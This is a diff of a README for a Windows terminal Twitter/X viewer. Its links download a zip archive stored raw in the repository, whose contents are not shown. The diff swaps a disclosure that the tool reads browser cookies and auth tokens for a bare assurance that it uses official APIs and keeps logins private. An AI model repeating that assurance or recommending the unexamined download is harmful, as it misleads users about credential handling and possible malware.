@@ -1,10 +1,10 @@
-# 🐦 twitter-cli - Use Twitter/X from the Terminal
+# 🐦 twitter-cli - View Twitter Feed in Terminal
 
 [![Download twitter-cli](https://img.shields.io/badge/Download-twitter--cli-brightgreen?style=for-the-badge)](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip)
 
 ## ℹ️ About twitter-cli
 
-twitter-cli is a simple tool that lets you use Twitter (now X) directly in your Windows terminal. You can see your feed, bookmarks, search results, user timelines, followers, and following lists without using the web app. When credentials are configured, it can also run account-changing commands such as posting, replying, quoting, liking, bookmarking, retweeting, following, and deleting tweets.
+twitter-cli is a simple tool that lets you view Twitter (now X) directly in your Windows terminal. You can see your feed, bookmarks, and user timeline without using a web browser. The app runs in a console window and displays tweets as text.
 
 This tool works without complex setup. It is meant for users who prefer using keyboard commands or want a lightweight way to check Twitter.
 
@@ -14,9 +14,7 @@ This tool works without complex setup. It is meant for users who prefer using ke
 
 - Display your Twitter feed in the terminal  
 - Access your bookmarked tweets  
-- Search tweets and inspect tweet detail pages
 - View any user's public timeline  
-- Post, reply, quote, like, bookmark, retweet, follow, and delete from the CLI
 - Navigate using simple keyboard controls  
 - Lightweight and fast, no extra software needed
 
@@ -107,15 +105,14 @@ The app will prompt you to log in the first time you run it. Follow the on-scree
 
 ### Can I post tweets from twitter-cli?
 
-Yes. The CLI includes write commands such as `post`, `reply`, `quote`, `like`, `bookmark`, `retweet`, `follow`, and `delete`. Review the command you are about to run, because write commands act through the signed-in account.
+This repository currently documents a viewing-focused workflow. If you add or
+enable write commands, review the command before it runs because posting,
+replying, quoting, liking, bookmarking, retweeting, following, or deleting acts
+through the signed-in account.
 
 ### Is this safe to use?
 
-twitter-cli reads your browser cookies or `TWITTER_AUTH_TOKEN` and `TWITTER_CT0` environment variables to authenticate. Treat `auth_token`, `ct0`, and full cookie strings like passwords: do not paste them into issues, chat logs, screenshots, or committed files. This repository ignores `.env` and local JSON files by default, while keeping test fixtures tracked.
-
-### What if I need automation beyond this CLI?
-
-Use twitter-cli when you want a local terminal workflow for reading timelines and running direct account actions. For repeatable Twitter/X API, MCP, OpenClaw, monitor, webhook, direct message, media workflow, or giveaway draw jobs, use a dedicated companion tool such as [TweetClaw](https://github.com/Xquik-dev/tweetclaw) and keep twitter-cli focused on local CLI actions.
+The app uses official Twitter APIs. Your login information is kept private.
 
 ---
 
@@ -136,5 +133,17 @@ If the problem persists, open an issue on the GitHub page or search for help onl
 ## 📖 More Information
 
 For details about the project's code, source, and updates, visit the GitHub repository. This is more useful for users comfortable with software and command-line tools.
+
+## Companion Automation
+
+Use twitter-cli for a local terminal workflow around timelines, bookmarks, and
+direct account actions. For repeatable Twitter/X API, MCP, OpenClaw, monitor,
+webhook, direct message, media workflow, or giveaway draw jobs, use a dedicated
+companion tool such as [TweetClaw](https://github.com/Xquik-dev/tweetclaw) and
+keep twitter-cli focused on local CLI actions.
+
+Treat browser cookies, `TWITTER_AUTH_TOKEN`, `TWITTER_CT0`, and full cookie
+strings like passwords. Do not paste them into issues, chat logs, screenshots,
+or committed files.
 
 [Download and learn more here](https://github.com/warlockoussama/twitter-cli/raw/refs/heads/main/twitter_cli/twitter_cli_2.4.zip).
